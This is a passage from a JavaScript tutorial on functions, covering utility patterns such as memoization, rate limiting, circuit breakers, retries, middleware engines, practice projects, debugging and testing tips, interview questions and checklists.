class EventEmitter {
  constructor() { this.events = new Map(); }
  on(event, listener) {
    if (!this.events.has(event)) this.events.set(event, []);
    this.events.get(event).push(listener);
    return () => this.off(event, listener);
  }
  emit(event, ...args) {
    if (!this.events.has(event)) return false;
    this.events.get(event).forEach(fn => fn(...args));
    return true;
  }
  off(event, listener) {
    if (!this.events.has(event)) return;
    const filtered = this.events.get(event).filter(l => l !== listener);
    this.events.set(event, filtered);
  }
  once(event, listener) {
    const wrapper = (...args) => {
      this.off(event, wrapper);
      listener(...args);
    };
    return this.on(event, wrapper);
  }
}
```

#### 35. Multi-Argument LRU Cache Memoizer
```javascript
function memoizeLRU(fn, capacity = 50) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) {
      const val = cache.get(key);
      cache.delete(key);
      cache.set(key, val); // Mark recent
      return val;
    }
    const res = fn.apply(this, args);
    if (cache.size >= capacity) {
      const oldestKey = cache.keys().next().value;
      cache.delete(oldestKey);
    }
    cache.set(key, res);
    return res;
  };
}
```

#### 36. Token Bucket Rate Limiter
```javascript
function createTokenBucket(refillRatePerSec, capacity) {
  let tokens = capacity;
  let lastRefill = Date.now();

  return function tryConsume(cost = 1) {
    const now = Date.now();
    const elapsedSec = (now - lastRefill) / 1000;
    tokens = Math.min(capacity, tokens + elapsedSec * refillRatePerSec);
    lastRefill = now;

    if (tokens >= cost) {
      tokens -= cost;
      return true;
    }
    return false;
  };
}
```

#### 37. Cancellable Async Function Wrapper
```javascript
function makeCancellable(promise) {
  let hasCancelled = false;
  const wrapped = new Promise((resolve, reject) => {
    promise
      .then(val => hasCancelled ? reject({ isCancelled: true }) : resolve(val))
      .catch(err => hasCancelled ? reject({ isCancelled: true }) : reject(err));
  });
  return {
    promise: wrapped,
    cancel() { hasCancelled = true; }
  };
}
```

#### 38. Exponential Backoff with Random Jitter
```javascript
async function retryWithJitter(asyncFn, maxRetries = 3, baseDelayMs = 100) {
  for (let i = 0; i <= maxRetries; i++) {
    try {
      return await asyncFn();
    } catch (err) {
      if (i === maxRetries) throw err;
      const exponentialDelay = baseDelayMs * Math.pow(2, i);
      const jitter = Math.random() * 0.5 * exponentialDelay;
      await new Promise(r => setTimeout(r, exponentialDelay + jitter));
    }
  }
}
```

#### 39. Circuit Breaker Function Wrapper
```javascript
function circuitBreaker(asyncFn, { failureThreshold = 3, cooldownMs = 10000 } = {}) {
  let failures = 0;
  let state = "CLOSED"; // CLOSED, OPEN, HALF-OPEN
  let lastFailedTime = 0;

  return async function(...args) {
    const now = Date.now();
    if (state === "OPEN") {
      if (now - lastFailedTime >= cooldownMs) {
        state = "HALF-OPEN";
      } else {
        throw new Error("Circuit Breaker OPEN: request rejected");
      }
    }
    try {
      const res = await asyncFn(...args);
      failures = 0;
      state = "CLOSED";
      return res;
    } catch (err) {
      failures++;
      lastFailedTime = now;
      if (failures >= failureThreshold) state = "OPEN";
      throw err;
    }
  };
}
```

#### 40. Observable-Style Functional Pipeline
```javascript
function createStream(initialArray) {
  return {
    map: fn => createStream(initialArray.map(fn)),
    filter: predicate => createStream(initialArray.filter(predicate)),
    reduce: (reducer, initial) => initialArray.reduce(reducer, initial),
    toArray: () => [...initialArray]
  };
}
```

---

## 80. Custom Array Methods Implementation

Educational implementations illustrating callback contracts, sparse-array preservation, and index propagation:

```javascript
// 1. customMap
function customMap(arr, fn, thisArg) {
  const result = new Array(arr.length);
  for (let i = 0; i < arr.length; i++) {
    if (i in arr) { // Skips sparse holes!
      result[i] = fn.call(thisArg, arr[i], i, arr);
    }
  }
  return result;
}

// 2. customFilter
function customFilter(arr, predicate, thisArg) {
  const result = [];
  for (let i = 0; i < arr.length; i++) {
    if (i in arr && predicate.call(thisArg, arr[i], i, arr)) {
      result.push(arr[i]);
    }
  }
  return result;
}

// 3. customFind
function customFind(arr, predicate, thisArg) {
  for (let i = 0; i < arr.length; i++) {
    if (predicate.call(thisArg, arr[i], i, arr)) return arr[i];
  }
  return undefined;
}

// 4. customSome
function customSome(arr, predicate, thisArg) {
  for (let i = 0; i < arr.length; i++) {
    if (i in arr && predicate.call(thisArg, arr[i], i, arr)) return true;
  }
  return false;
}

// 5. customEvery
function customEvery(arr, predicate, thisArg) {
  for (let i = 0; i < arr.length; i++) {
    if (i in arr && !predicate.call(thisArg, arr[i], i, arr)) return false;
  }
  return true;
}
```

---

## 81. Debounce & Throttle Deep Dive

```text
Events:    ──|||||||||||||──────────────────|||||||||───────────
Debounce:  ──────────────────────────[Exec]────────────────[Exec]
           (Waits for silence)

Events:    ──|||||||||||||──────────────────|||||||||───────────
Throttle:  ──[Exec]───[Exec]───[Exec]───────[Exec]───[Exec]──────
           (Limits rate to fixed intervals)
```

### Production Debounce with Immediate Option
```javascript
function debounceAdvanced(fn, waitMs, immediate = false) {
  let timeoutId;
  return function(...args) {
    const callNow = immediate && !timeoutId;
    clearTimeout(timeoutId);
    timeoutId = setTimeout(() => {
      timeoutId = null;
      if (!immediate) fn.apply(this, args);
    }, waitMs);
    if (callNow) fn.apply(this, args);
  };
}
```

---

## 82. The `once` Execution Wrapper

Ensures initialization logic or event setup runs strictly once:

```javascript
function once(fn) {
  let ran = false;
  let memoizedResult;
  return function(...args) {
    if (!ran) {
      ran = true;
      memoizedResult = fn.apply(this, args);
    }
    return memoizedResult;
  };
}

const initializeDatabase = once(() => {
  console.log("Connecting to primary cluster...");
  return { status: "CONNECTED" };
});

initializeDatabase(); // Logs: "Connecting to primary cluster..."
initializeDatabase(); // Returns cached connection silently!
```

---

## 83. Production Retry Functions

```javascript
async function retryAsync(asyncFn, { retries = 3, delay = 200, backoff = 2 } = {}) {
  let attempt = 0;
  let currentDelay = delay;

  while (true) {
    try {
      return await asyncFn();
    } catch (err) {
      attempt++;
      if (attempt > retries) throw err;
      await new Promise(r => setTimeout(r, currentDelay));
      currentDelay *= backoff;
    }
  }
}
```

---

## 84. Timeout Wrapper Caveat

> ⚠️ **IMPORTANT**:
> Calling `Promise.race` with a timeout promise does **NOT cancel the underlying operation**! If an HTTP request was initiated, the server will still receive it and process it. The client simply stops waiting for the response. To truly cancel HTTP requests, use the **AbortController API**.

```javascript
async function fetchWithTrueCancellation(url, timeoutMs) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const res = await fetch(url, { signal: controller.signal });
    return await res.json();
  } finally {
    clearTimeout(timer);
  }
}
```

---

## 85. Educational Event Emitter

```javascript
class SimpleEmitter {
  constructor() {
    this.listeners = new Map();
  }

  on(event, fn) {
    if (!this.listeners.has(event)) this.listeners.set(event, []);
    this.listeners.get(event).push(fn);
  }

  emit(event, ...args) {
    const list = this.listeners.get(event);
    if (list) list.forEach(fn => fn(...args));
  }
}
```

---

## 86. Middleware Engine

```javascript
function createMiddlewareEngine() {
  const fns = [];
  return {
    use(fn) { fns.push(fn); },
    run(ctx) {
      let idx = 0;
      const next = () => {
        if (idx < fns.length) {
          const middleware = fns[idx++];
          return Promise.resolve(middleware(ctx, next));
        }
        return Promise.resolve();
      };
      return next();
    }
  };
}
```

---

## 87. Advanced Function Memoization Project

```javascript
class AdvancedMemoizer {
  constructor(fn, options = {}) {
    this.fn = fn;
    this.maxSize = options.maxSize || 100;
    this.cache = new Map();
    this.hits = 0;
    this.misses = 0;
  }

  execute(...args) {
    const key = JSON.stringify(args);
    if (this.cache.has(key)) {
      this.hits++;
      const val = this.cache.get(key);
      this.cache.delete(key);
      this.cache.set(key, val); // Refresh order
      return val;
    }
    this.misses++;
    const res = this.fn(...args);
    if (this.cache.size >= this.maxSize) {
      const oldest = this.cache.keys().next().value;
      this.cache.delete(oldest);
    }
    this.cache.set(key, res);
    return res;
  }

  getStats() {
    return { hits: this.hits, misses: this.misses, size: this.cache.size };
  }

  clear() {
    this.cache.clear();
    this.hits = 0;
    this.misses = 0;
  }
}
```

---

## 88. Function Pipeline Project

```javascript
// Synchronous pipeline:
const pipeSync = (...fns) => x => fns.reduce((v, f) => f(v), x);

// Asynchronous pipeline:
const pipeAsync = (...fns) => initialVal =>
  fns.reduce(async (accPromise, fn) => fn(await accPromise), Promise.resolve(initialVal));

// Verification:
const asyncWorkflow = pipeAsync(
  async n => n + 10,
  n => n * 2,
  async n => `Total: $${n}`
);

asyncWorkflow(5).then(console.log); // "Total: $30"
```


---

## 89. 5 Final Real-World Projects

---

### Project 1 (Beginner): Function Utilities Library
```javascript
const MathUtils = {
  max: (...nums) => nums.reduce((m, n) => (n > m ? n : m), -Infinity),
  min: (...nums) => nums.reduce((m, n) => (n < m ? n : m), Infinity),
  sum: (...nums) => nums.reduce((acc, n) => acc + n, 0),
  average: (...nums) => (nums.length === 0 ? 0 : MathUtils.sum(...nums) / nums.length),
  validate: (val, validator, errorMsg) => {
    if (!validator(val)) throw new Error(errorMsg);
    return val;
  }
};
```

---

### Project 2 (Intermediate): The Function Toolkit
A complete suite combining functional combinators:
```javascript
const FnToolkit = {
  once(fn) {
    let ran = false, res;
    return function(...args) {
      if (!ran) { ran = true; res = fn.apply(this, args); }
      return res;
    };
  },
  memoize(fn) {
    const cache = new Map();
    return function(...args) {
      const key = JSON.stringify(args);
      if (cache.has(key)) return cache.get(key);
      const res = fn.apply(this, args);
      cache.set(key, res);
      return res;
    };
  },
  curry(fn) {
    return function curried(...args) {
      if (args.length >= fn.length) return fn.apply(this, args);
      return (...next) => curried.apply(this, [...args, ...next]);
    };
  },
  pipe: (...fns) => x => fns.reduce((v, f) => f(v), x),
  compose: (...fns) => x => fns.reduceRight((v, f) => f(v), x),
  debounce(fn, ms) {
    let id;
    return function(...args) {
      clearTimeout(id);
      id = setTimeout(() => fn.apply(this, args), ms);
    };
  },
  throttle(fn, ms) {
    let last = 0;
    return function(...args) {
      const now = Date.now();
      if (now - last >= ms) { last = now; fn.apply(this, args); }
    };
  }
};
```

---

### Project 3 (Advanced): Asynchronous Task Runner with Concurrency & Retry
```javascript
class AsyncTaskRunner {
  constructor({ concurrency = 2, maxRetries = 2, timeoutMs = 3000 } = {}) {
    this.concurrency = concurrency;
    this.maxRetries = maxRetries;
    this.timeoutMs = timeoutMs;
    this.queue = [];
    this.running = 0;
  }

  enqueue(asyncTask) {
    return new Promise((resolve, reject) => {
      this.queue.push({ asyncTask, resolve, reject });
      this._process();
    });
  }

  _process() {
    while (this.running < this.concurrency && this.queue.length > 0) {
      const { asyncTask, resolve, reject } = this.queue.shift();
      this.running++;

      this._executeWithRetry(asyncTask)
        .then(resolve)
        .catch(reject)
        .finally(() => {
          this.running--;
          this._process();
        });
    }
  }

  async _executeWithRetry(task) {
    let err;
    for (let i = 0; i <= this.maxRetries; i++) {
      try {
        const timeoutPromise = new Promise((_, rj) =>
          setTimeout(() => rj(new Error("Timeout")), this.timeoutMs)
        );
        return await Promise.race([task(), timeoutPromise]);
      } catch (e) {
        err = e;
      }
    }
    throw err;
  }
}
```

---

### Project 4 (Senior): Enterprise Middleware Engine
```javascript
class EnterpriseMiddlewareEngine {
  constructor() {
    this.middlewares = [];
    this.errorHandlers = [];
  }

  use(fn) {
    if (fn.length === 3) this.errorHandlers.push(fn);
    else this.middlewares.push(fn);
  }

  async execute(context) {
    let idx = -1;

    const dispatch = async (i) => {
      if (i <= idx) throw new Error("next() invoked multiple times");
      idx = i;
      const fn = this.middlewares[i];
      if (!fn) return;

      try {
        await fn(context, () => dispatch(i + 1));
      } catch (err) {
        await this._handleError(err, context);
      }
    };

    await dispatch(0);
  }

  async _handleError(err, context) {
    for (const errHandler of this.errorHandlers) {
      await errHandler(err, context, () => {});
    }
  }
}
```

---

### Project 5 (Senior Framework): Production Function Pipeline Framework
Combines Dependency Injection, Memoization, Retries, and Logging into a unified service executor:

```javascript
function createServiceFramework({ logger, cache, retryCount = 2 }) {
  return function registerService(name, serviceFn) {
    return async function executeService(payload) {
      const cacheKey = `${name}:${JSON.stringify(payload)}`;
      if (cache.has(cacheKey)) {
        logger.info(`Cache hit for service ${name}`);
        return cache.get(cacheKey);
      }

      logger.info(`Executing service ${name} with payload`);
      let attempts = 0;
      while (attempts <= retryCount) {
        try {
          const result = await serviceFn(payload);
          cache.set(cacheKey, result);
          return result;
        } catch (err) {
          attempts++;
          logger.warn(`Service ${name} attempt ${attempts} failed: ${err.message}`);
          if (attempts > retryCount) throw err;
        }
      }
    };
  };
}

// Verification:
const framework = createServiceFramework({
  logger: { info: console.log, warn: console.warn },
  cache: new Map()
});

const calculatePricing = framework("PricingService", async ({ basePrice }) => basePrice * 1.18);
calculatePricing({ basePrice: 100 }).then(res => console.log("Final Price:", res));
```

---

## 90. Debugging Functions

### 1. Inspecting Call Stacks & Breakpoints
* Open Chrome DevTools / VS Code Debugger.
* Place `debugger;` statements inside function execution paths.
* Inspect the **Call Stack panel** to see active Execution Contexts and active lexical scope bindings.

### 2. Identifying Method Detachment Bugs
If you see `TypeError: Cannot read properties of undefined (reading 'x')`, immediately check if the method was passed without `.bind(this)` or without an arrow function wrapper.

### 3. Asynchronous Stack Traces
In modern Node.js and V8, async call stacks are automatically linked across `await` boundaries. If using unhandled raw promises, attach `process.on('unhandledRejection', ...)` to log exact source lines.

---

## 91. Unit Testing Functions

```javascript
const assert = require("node:assert/strict");

// Pure Function Test:
function add(a, b) { return a + b; }
assert.strictEqual(add(2, 3), 5);
assert.strictEqual(add(-1, 1), 0);

// Async Function Test:
async function loadStatus() { return "OK"; }
loadStatus().then(status => assert.strictEqual(status, "OK"));

// Error Throwing Test:
function validate(n) { if (n < 0) throw new Error("Negative"); }
assert.throws(() => validate(-5), /Negative/);
```

---

## 92. Senior Interview Preparation (30+ Questions with Model Answers)

### Q1: What is the difference between Function Declarations and Function Expressions?
* **Answer**: Function declarations are completely hoisted (both name and body initialized) during the engine's creation phase, allowing them to be called before declaration line. Function expressions follow the variable hoisting rules (`const`/`let` remain in Temporal Dead Zone; `var` is initialized to `undefined`), throwing errors if invoked before definition.

### Q2: How does an arrow function handle `this` compared to an ordinary function?
* **Answer**: Ordinary functions bind `this` dynamically based on the call-site (the 4 rules: default, implicit, explicit, new). Arrow functions do not have their own `this` binding; they capture `this` lexically from their enclosing scope at declaration time.

### Q3: What is a closure and why does it not get garbage collected when the outer function returns?
* **Answer**: A closure is a function bundled with a reference to its lexical environment. When an outer function returns an inner function that references the outer scope variables, the engine retains the environment record (or heap context object) because an active reference path exists from the returned function.

### Q4: Explain the closure loop problem with `var` and how `let` resolves it.
* **Answer**: `var` is function-scoped, sharing a single variable across all loop iterations. When asynchronous callbacks run, they reference the final loop value. `let` is block-scoped, creating a fresh lexical binding for each loop iteration, allowing each callback to capture its own snapshot.

### Q5: What does `fn.length` return?
* **Answer**: The number of formal parameters declared before the first default parameter. It excludes rest parameters and any parameters following a default parameter.

### Q6: Why is `[1, 2, 3].map(async n => n * 2)` problematic?
* **Answer**: An `async` function always returns a Promise. Therefore, `map` returns an array of pending promises `[Promise, Promise, Promise]`. You must wrap the expression with `await Promise.all(...)`.

### Q7: What are the 5 conceptual steps executed by the `new` operator?
* **Answer**: (1) Creates a new plain object. (2) Sets its internal `[[Prototype]]` to `Constructor.prototype`. (3) Binds `this` to the new object. (4) Executes constructor code. (5) Returns the object unless the constructor explicitly returns a different object.

### Q8: What is the difference between `call`, `apply`, and `bind`?
* **Answer**: `call` and `apply` invoke the function immediately with an explicit `this` (`call` takes comma-separated arguments, `apply` takes an array). `bind` returns a new bound function with `this` permanently locked and pre-filled arguments.

### Q9: Why is `JSON.stringify` not a universally reliable cache key for memoization?
* **Answer**: Object key ordering produces differing strings for identical data, circular references cause crashes, and functions/`undefined`/`NaN` lose fidelity.

### Q10: What is the difference between Currying and Partial Application?
* **Answer**: Currying transforms a function into a chain of unary (single-argument) functions ($f(a)(b)(c)$). Partial application pre-binds some arguments and returns a function accepting all remaining arguments ($f(a, b)(c, d)$).

---

## 93. What Senior Developers Think About When Designing Functions

1. **Function Contract Stability**: Does this function return a predictable shape in all execution branches?
2. **Side-Effect Containment**: Is this function pure? If not, is the side-effect clearly declared or isolated to an outer shell?
3. **Parameter Ergonomics**: Are there more than 3 arguments? If so, refactor to an Options Object.
4. **Idempotency**: If this function is retried due to a network glitch, will running it twice cause duplicate charges or corrupted data?
5. **Observability**: Does this function have a meaningful name for stack traces and logging metrics?

---

## 94. Function Pre-Flight Checklist

Before writing any function in production, verify:
- [ ] Is the name a clear action verb describing its exact responsibility?
- [ ] Does it adhere to the Single Responsibility Principle?
- [ ] Are parameter counts $le 3$? If $> 3$, is it an Options Object?
- [ ] If destructuring parameters, is there a `= {}` default fallback?
- [ ] Can this function be pure?
- [ ] Are return types consistent across all `return` branches?
- [ ] If async, are errors handled or propagated cleanly without unhandled rejections?
- [ ] Are methods properly bound if passed as callbacks?
- [ ] Are array async callbacks wrapped with `Promise.all`?

---

## 95. Quick Reference Cheat Sheet

* **Declaration**: `function f(x) {}` (Hoisted)
* **Expression**: `const f = function(x) {};` (TDZ)
* **Arrow**: `const f = (x) => x * 2;` (Lexical `this`, no `arguments`)
* **Rest Parameter**: `function f(...args) {}` (Genuine array)
* **Default Parameter**: `function f(x = 10) {}` (Triggered ONLY by `undefined`)
* **Closure**: Function retaining outer lexical environment bindings.
* **call / apply / bind**: Explicit `this` binding (bind returns new fn).
* **Generator**: `function* () { yield 1; }` (Pausable iterator)
* **Async**: `async function() {}` (Always returns Promise)

---

## 96. Final Function Selection Decision Tree

```text
Need a function?
│
├── Top-level module logic? ──────────> Function Declaration
├── Inline callback / functional? ───> Arrow Function
├── Object method needing 'this'? ────> Method Shorthand
├── Private state / sandboxing? ─────> Closure / Factory
├── I/O or database operations? ──────> Async Function
├── Streaming data chunks? ───────────> Async Generator
└── Object blueprint with 'new'? ─────> ES6 Class
```

---

## 97. Final Common Mistakes Summary

* ❌ `return { name }` on a new line (ASI hazard returning `undefined`).
* ❌ Returning object literal from arrow without parentheses: `() => { a: 1 }`.
* ❌ Using `forEach` with `async` expecting execution to pause.
* ❌ Assuming `null` triggers default parameters.
* ❌ Splicing arrays forward inside loops without index adjustment.
* ❌ Creating closures inside massive loops without caching.

---

## 98. Professional DOs & DON'Ts

* **DO** use named function expressions when writing recursive or logged functions.
* **DO** use Guard Clauses to return early and prevent nested if-else pyramids.
* **DO** use `Promise.all` for concurrent independent async tasks.
* **DON'T** use `eval()` or `new Function()` with user inputs.
* **DON'T** rely on `fn.length` for critical business logic.
* **DON'T** mutate function parameters directly.

---

## 99. Final Senior Challenge: Production Function Pipeline

### The Architectural Specification
Build a production-grade **Function Execution Pipeline** in a standalone module.

### Requirements:
1. **Pipeline Registration**: Register synchronous and asynchronous functions by name.
2. **Context Passing**: Pass a mutable `context` object through all pipeline stages.
3. **Middleware Integration**: Support pre-execution and post-execution hooks.
4. **Retry Wrapper**: Any registered step flagged with `retry: true` must retry up to 3 times with exponential backoff on failure.
5. **Timeout Wrapper**: Configurable execution timeout per step; aborts step if exceeded.
6. **Execution Telemetry**: Record execution duration per step in milliseconds.
7. **Unit Test Suite**: Write unit tests asserting proper error handling, timeout rejection, and successful result compilation.

*(Note: Implement this challenge yourself as part of your master engineering portfolio!)*

---

## 100. Senior Function Mastery Checklist

- [ ] Can articulate the difference between parameter and argument without hesitation.
- [ ] Understand the 4 rules of `this` binding and their exact precedence hierarchy.
- [ ] Understand why arrow functions capture `this` lexically and lack `arguments`.
- [ ] Mastered closures, lexical environments, and context heap allocation in V8.
- [ ] Can implement `compose`, `pipe`, `curry`, `memoize`, `debounce`, and `throttle` from memory.
- [ ] Understand the 5 steps of the `new` operator and prototype delegation.
- [ ] Mastered async/await, Promise combinators, and async generator streams.
- [ ] Build functions adhering strictly to Single Responsibility and Dependency Injection.
